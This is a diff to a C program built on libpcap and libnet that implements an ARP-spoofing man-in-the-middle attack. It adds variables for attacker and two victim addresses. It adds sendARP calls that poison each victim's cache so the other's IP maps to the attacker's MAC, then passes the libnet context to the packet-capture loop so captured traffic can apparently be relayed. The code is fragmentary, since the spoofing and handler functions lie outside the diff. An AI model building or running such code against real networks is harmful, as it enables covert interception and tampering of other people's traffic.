@@ -11,7 +11,19 @@
 #include "utils.h"
 #include "targets.h"
 
+struct in_addr ip_attacker;
+struct libnet_ether_addr *mac_attacker;
 
+//IP and MAC from victim1
+struct in_addr ip_victim1;
+struct libnet_ether_addr *mac_victim1;
+
+//IP and MAC from victim2
+struct in_addr ip_victim2;
+struct libnet_ether_addr *mac_victim2;
+
+//broadcast
+struct libnet_ether_addr *mac_bcast;
 
 int main(int argc,char *argv[]){
 	// TODO: verbose mode ('-v')
@@ -22,6 +34,8 @@ int main(int argc,char *argv[]){
 	}
 	char error_buffer[PCAP_ERRBUF_SIZE];    // Buffer to capture errors for libpcap
 	char errbuf[LIBNET_ERRBUF_SIZE];       // Buffer to capture errors for libnet
+                                           
+   
 	int timeout_limit = 100;              // Timeout limit (in ms)
 	int snapshot_length = 1024;             // How many bytes to capture
 	int total_packet_count = 0;           // How many packets to capture
@@ -39,7 +53,7 @@ int main(int argc,char *argv[]){
 
 
 	/* Open device for live capture */
-	pcap_t *handle = pcap_open_live(alldevs->name,snapshot_length,0,timeout_limit,error_buffer);
+	pcap_t *handle = pcap_open_live( alldevs->name ,snapshot_length,0,timeout_limit,error_buffer);
 
 	/* Create a contex for libnet */
 	libnet_t *l = libnet_init(LIBNET_LINK,alldevs->name,errbuf);
@@ -47,9 +61,14 @@ int main(int argc,char *argv[]){
 	/* Initialize all targets */
 	construct_targets(l,argc,argv);
 
+	sendARP(mac_victim1,ip_victim1,ip_victim2,mac_attacker,l);
+	sendARP(mac_victim2,ip_victim2,ip_victim1,mac_attacker,l);
+
 	/* loop to capture packets */
-	u_char *my_arguments=NULL;
-	pcap_loop(handle, total_packet_count, my_packet_handler, my_arguments);
+	pcap_loop(handle, total_packet_count, my_packet_handler, (u_char *)l);
+
+	printf("exited the loop");
+	pcap_close(handle);
 
 	/* free devices */
 	pcap_freealldevs(alldevs);
